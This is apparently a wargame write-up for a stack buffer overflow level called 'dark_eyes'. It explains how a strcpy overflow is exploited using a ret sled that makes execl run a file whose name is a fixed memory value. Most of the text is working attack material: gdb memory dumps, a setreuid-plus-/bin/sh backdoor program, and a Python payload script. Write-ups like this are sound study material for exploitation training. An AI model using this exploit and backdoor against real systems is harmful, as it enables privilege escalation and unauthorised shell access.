# Vulnerability
```c
char buffer[256];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check boundary.

# Exploitation
```c
// save sfp 
memcpy(saved_sfp, buffer+264, 4);

// restore sfp 
memcpy(buffer+264, saved_sfp, 4);
```

This code makes me not able to use fake ebp, But give hint with "ret sleding".

If I call ret many times, the esp goes up and I can use stack's value as library function's parameter.

```
0xfef33360:	0x41414141	0x41414141	0xfef333c8	0x080484b9
0xfef33370:	0x080484b9	0x080484b9	0x080484b9	0x0070ea00
0xfef33380:	0x0083eff4	0x00000000	0xfef33380	0xfef333c8
```
After the buffer, You can see 0x0083eff4 and this value does not changed when I executed again.

I use this address as execl's param 1 and since next address contains '\x00', I can use it as execl's param 2.

By calling ret 4 times and execl function, the execl will take param1 as 0x0083eff4's value.

```
(gdb) x/4x 0x0083eff4
0x83eff4 <svcauthsw+712>:	0x0083ed3c	0x00730b96	0x00000000	0x00818df0
```

As 0x0083eff4's value is 0x0083ed3c, I will make a backdoor file named 0x0083ed3c.

The backdoor.c is:
```c
#include <stdio.h>
int main(void) {
	setreuid(geteuid(), geteuid());
	system("/bin/sh");
}
```
And compile it as what I wanted:
```
[iron_golem@Fedora_1stFloor ~]$ gcc -o ./`python -c 'print "\x3c\xed\x83"'` ./backdoor.c
```

Now, When I send payload, The execl will execute '\x3c\xed\x83' program.

Since execl address contain '\x20', I used '-1' address not to contain '\x20'.

```assembly
(gdb) x/4i execl-1
0x7a571f <execle+271>:	nop    
0x7a5720 <execl>:	push   %ebp
0x7a5721 <execl+1>:	mov    %esp,%ebp
0x7a5723 <execl+3>:	lea    0x10(%ebp),%ecx
```
# Payload
```python
import os

filename = "/home/iron_golem/dark_eyes"

payload = ""
payload += "A"*264 # buffer + dummy
payload += "\xb9\x84\x04\x08"*4 # ret sled 4 times
payload += "\x1f\x57\x7a" # execl - 1

os.execv(filename, [filename, payload])
```
